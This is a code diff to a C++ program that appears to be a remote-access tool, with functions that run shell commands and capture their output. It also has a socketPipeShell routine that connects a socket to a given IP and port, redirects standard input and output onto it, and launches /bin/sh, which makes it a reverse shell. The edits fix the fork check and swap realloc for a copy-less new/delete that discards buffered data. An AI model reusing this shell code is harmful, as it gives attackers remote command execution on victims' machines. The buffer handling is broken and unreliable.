@@ -33,9 +33,10 @@ bool proxy_to_cmd(string args_shell){
 }
 
 
-// this function not return nullptr in fatal error: cstyle string empty or with the error 
+// this function not return nullptr in fatal error: cstyle string empty or with the error
 char* run_pshell(const char* args_shell, size_t &lout, bool proxy) {
     
+ 
     const char* err = "bad process output";
     size_t lerr = strlen(err);
     char* error  = new char[lerr+1];
@@ -59,7 +60,10 @@ char* run_pshell(const char* args_shell, size_t &lout, bool proxy) {
         size_t bRead = fread(buffer, 1, b4K, pipe);
         if (!bRead){break;} 
         if (b4K < lout+bRead){
-            char* _xptr = static_cast<char*>(realloc(output, lout+bRead));
+            // realloc
+            char* _xptr = new char[lout+bRead];
+            delete[]output;
+            output = _xptr;
             if (_xptr == nullptr){
                 break;
 
@@ -82,7 +86,7 @@ char* run_pshell(const char* args_shell, size_t &lout, bool proxy) {
     delete[] buffer;
     delete[] error;
     output[lout] = '\0';
-    
+    // SUCCESS
     return output;
 }
 
@@ -102,11 +106,11 @@ void socketPipeShell(const char* ip, unsigned port, const char* _app){
     // #1: valid?
     if (child_pid < 0){close(sock);return;}
     // #2: SIGNAL
-    if (child_pid < 0 || !child_pid){
+    if (child_pid == 0){
         dup2(sock, 0);
         dup2(sock, 1);
         dup2(sock, 2);
-        char * const argv[] = {"/bin/sh", NULL};
+        char * const argv[] = {const_cast<char*>("/bin/sh"), NULL};
         execve("/bin/sh", argv, NULL);
     }
     int status;
